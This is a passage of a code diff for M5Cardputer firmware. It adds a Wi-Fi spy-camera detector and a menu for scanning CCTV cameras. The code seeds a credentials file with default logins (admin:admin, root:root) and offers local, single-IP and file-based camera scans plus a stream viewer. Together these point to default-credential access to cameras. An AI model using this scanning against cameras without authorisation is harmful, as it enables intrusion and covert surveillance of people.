+    const char* p = (const char*)pgm_read_ptr(&HC_SPYCAM_OUI_LIST[i]);
+    pgmReadString(p, tmpA, sizeof(tmpA));
+    if (strcmp(tmpB, tmpA) == 0) {
+      strncpy(reasonOut, "OUI_MATCH", reasonLen-1); reasonOut[reasonLen-1]='\0';
+      return true;
+    }
+  }
+  return false;
+}
+
+// =========================
+// 5) FONCTION PRINCIPALE
+// =========================
+void scanCCTV_SpyDectection() {
+  M5.Display.fillScreen(menuBackgroundColor);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextColor(menuTextUnFocusedColor);
+  M5.Display.setCursor(0, 0);
+  M5.Display.println("SpyCam Scan (HC)...");
+  M5.Display.setTextSize(1.5);
+  M5.Display.println("ENTER/BACK: exit");
+  M5.Display.display();
+
+  spycamScanningHC = true;
+  lastWifiScanHC = 0; lastUiHC = 0;
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  enterDebounce();
+
+  while (spycamScanningHC) {
+    M5.update(); M5Cardputer.update();
+
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
+        M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      spycamScanningHC = false; break;
+    }
+
+    unsigned long now = millis();
+    if (now - lastWifiScanHC >= WIFI_SCAN_PERIOD_MS) {
+      lastWifiScanHC = now;
+      int n = WiFi.scanNetworks(false, true);
+
+      if (n > 0) {
+        for (int i = 0; i < n; i++) {
+          String ss = WiFi.SSID(i);
+          const char* ssidC = ss.length() ? ss.c_str() : "<hidden>";
+          int32_t rssi = WiFi.RSSI(i);
+          uint8_t* bssidp = WiFi.BSSID(i);
+          char bssidStr[18]; bssidToStrHC(bssidp, bssidStr, sizeof(bssidStr));
+          int32_t ch = WiFi.channel(i);
+          wifi_auth_mode_t auth = (wifi_auth_mode_t)WiFi.encryptionType(i);
+
+          char reasonSSID[16]; reasonSSID[0]='\0';
+          bool suspectSSID = isSpyBySSIDHC(ssidC, reasonSSID, sizeof(reasonSSID));
+          char oui[9]; ouiFromBssidHC(bssidStr, oui, sizeof(oui));
+          char reasonOUI[16]; reasonOUI[0]='\0';
+          bool matchOUI = isSpyByOUIHC(oui, reasonOUI, sizeof(reasonOUI));
+          bool strong = (rssi >= RSSI_ALERT_THRESHOLD);
+
+          bool isRealSuspect = (suspectSSID && matchOUI);
+
+          snprintf(msgBuf, sizeof(msgBuf),
+                   "Scanning for SpyCam\n"
+                   "__________________________\n"
+                   "SSID: %.28s\n"
+                   "BSSID: %s\n"
+                   "CH:%d  RSSI:%ddBm\n"
+                   "AUTH: %s\n"
+                   "SpyCam: %s [%s/%s]\n"
+                   "__________________________\n"
+                   "Bip when SpyCam detected",
+                   ssidC,
+                   bssidStr,
+                   ch, (int)rssi,
+                   authToTextHC(auth),
+                   isRealSuspect ? (strong ? "Probable (NEAR)" : "Probable") : "No",
+                   reasonSSID, reasonOUI);
+
+          drawSpycamScreenHC(msgBuf, isRealSuspect);
+        }
+      }
+    }
+    delay(20);
+  }
+
+  M5.Display.fillScreen(menuBackgroundColor);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(0, M5.Display.height()/2);
+  M5.Display.println("Stopping SpyCam scan...");
+  M5.Display.display();
+  delay(700);
+  waitAndReturnToMenu("Return to menu");
+}
+
+
+
+void scanCCTVCameras() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    M5.Display.fillScreen(menuBackgroundColor);
+    M5.Display.setTextSize(1.5);
+    M5.Display.setCursor(0, M5.Display.height()/2);
+    M5.Display.println("Not connected...");
+    M5.Display.println("Only SpyCam detector");
+    M5.Display.display();
+    delay(1000);
+  }
+
+  // --- Ensure /evil/CCTV directory exists ---
+  if (SD.exists("/evil/CCTV")) {
+    File d = SD.open("/evil/CCTV");
+    bool isDir = d && d.isDirectory();
+    if (d) d.close();
+    if (!isDir) {
+      waitAndReturnToMenu("SD error: /evil/CCTV exists but is not a directory");
+      return;
+    }
+  } else {
+    if (!SD.mkdir("/evil/CCTV")) {
+      waitAndReturnToMenu("SD error: cannot create /evil/CCTV");
+      return;
+    }
+  }
+
+  // --- Ensure /evil/CCTV/CCTV_IP.txt exists ---
+  if (!SD.exists(CCTV_FILE)) {
+    File f = SD.open(CCTV_FILE, FILE_WRITE);
+    if (!f) {
+      waitAndReturnToMenu("SD error: cannot create CCTV_IP.txt");
+      return;
+    }
+    f.println("# List of CCTV IP addresses");
+    f.println("# one IP per line, e.g.:");
+    f.println("# 192.168.1.10");
+    f.close();
+  }
+
+  // --- Ensure /evil/CCTV/credentials.txt exists ---
+  if (!SD.exists(CREDS_FILE)) {
+    File cf = SD.open(CREDS_FILE, FILE_WRITE);
+    if (!cf) {
+      waitAndReturnToMenu("SD error: cannot create credentials.txt");
+      return;
+    }
+    cf.println("# one per line: user:pass");
+    cf.println("admin:admin");
+    cf.println("user:user");
+    cf.println("root:root");
+    cf.close();
+  }
+
+  // ========= Menu parent en boucle =========
+  for (;;) {
+    // 0 = local, 1 = ip unique, 2 = from file, 3 = viewer, -1 = cancel/back (retour menu principal)
+    int sel = chooseScanModeMenu();
+
+    if (sel < 0) {
+      // BACKSPACE / Cancel dans le menu scan => retour au menu principal
+      waitAndReturnToMenu("Back To Main Menu");
+      return;
+    }
+
+    // Dispatch : chaque sous-fonction revient ici quand elle se termine
+    if      (sel == 0) scanCCTVCamerasLocal();
+    else if (sel == 1) scanCCTVCamerasSingleIP();
+    else if (sel == 2) scanCCTVCamerasFromFile();
+    else if (sel == 3) runCCTV_MJPEGViewer();
+    else if (sel == 4) scanCCTV_SpyDectection();backDebounce();
+  }
+} 
